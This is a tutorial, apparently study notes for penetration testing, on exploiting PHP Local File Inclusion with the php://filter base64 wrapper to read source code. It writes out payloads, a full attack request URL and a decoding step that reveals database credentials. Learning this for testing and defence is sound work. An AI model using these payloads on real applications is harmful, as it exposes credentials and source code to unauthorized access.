## Overview

When a Local File Inclusion (LFI) vulnerability exists in a PHP application, we can leverage **PHP wrappers** to enhance exploitation capabilities.

PHP wrappers allow access to internal data streams and transformations such as:

- encoding
- compression
- file handling
- memory streams
- input/output streams

One of the most useful wrappers for LFI exploitation is:

```
php://filter
```

Using PHP filters, we can **read PHP source code instead of executing it**, which often reveals:

- credentials
- API keys
- database connection strings
- hidden functionality
- file paths
- internal logic
- authentication mechanisms

---

# Why PHP Filters Matter

Normally when we include a PHP file through LFI:

```text
index.php?language=config
```

The server executes the file.

If the file only defines variables:

```php
$config['db_password']="SuperSecret";
```

No output appears in the browser.

This makes direct file inclusion less useful.

PHP filters allow us to read raw source code.

---

# PHP Wrapper Basics

PHP wrappers use special stream identifiers:

```text
php://
```

General format:

```text
php://filter/read=FILTER/resource=FILE
```

Key parameters:

| parameter | purpose |
|----------|---------|
| read | filter applied to resource |
| resource | target file |

---

# Useful Filter for LFI

### Base64 Encoding Filter

```text
convert.base64-encode
```

Encodes file contents before execution.

Result:

application outputs encoded source code.

---

# Basic Exploit

Target file:

```text
config.php
```

Payload:

```text
php://filter/read=convert.base64-encode/resource=config
```

Full request:

```text
http://target/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

Application appends extension:

```text
config.php
```

PD9waHAKICRkYl91c2VyID0gInJvb3QiOwokZGJfcGFzcyA9ICJwYXNzd29yZCI7

# Decode Source Code

Linux:

```bash
echo 'PD9waHAKICRkYl91c2VyID0gInJvb3QiOwokZGJfcGFzcyA9ICJwYXNzd29yZCI7' | base64 -d
```

Output:

```php
<?php

$db_user = "root";
$db_pass = "password";

?>
```

Sensitive credentials discovered.

# Why Base64 Encoding Works

Normally:

```php
include("config.php");
```

PHP executes file.

With filter:

```text
php://filter/read=convert.base64-encode/resource=config
```

PHP:

1. reads file
2. encodes content
3. outputs encoded string
4. does not execute PHP logic

# Additional PHP Filters

Other useful filters include:

| filter | function |
|-------|----------|
| convert.base64-encode | encode output |
| convert.base64-decode | decode input |
| zlib.deflate | compression |
| string.rot13 | string transformation |

Base64 encoding remains most useful for LFI.

---

# Important Notes

Filter must appear before resource:

Correct:

```text
php://filter/read=convert.base64-encode/resource=index
```

Incorrect:

```text
php://filter/resource=index/read=convert.base64-encode
```

---

# Viewing Full Encoded Output

Sometimes output truncated in browser.

Use:

```text
CTRL+U
```

to view page source.

Ensure full encoded string copied.

Incomplete copy results in decoding errors.

---

# Limitations

PHP filters require:

- PHP backend
- include() or similar function
- readable file permissions

If file unreadable:

permission denied error occurs.
